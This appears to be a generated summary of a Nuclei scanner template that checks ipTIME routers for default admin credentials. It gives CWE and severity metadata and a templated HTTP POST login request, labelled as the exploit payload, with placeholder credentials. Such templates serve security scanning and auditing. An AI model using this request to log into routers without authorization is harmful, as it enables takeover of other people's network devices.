# Nuclei Template: ipTIME Default Login
**Template ID:** iptime-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`iptime-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ipTIME default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /sess-bin/login_handler.cgi HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}/sess-bin/login_session.cgi

username={{username}}&passwd={{password}}
```

## References
- https://www.freewebtools.com/IPTIME/
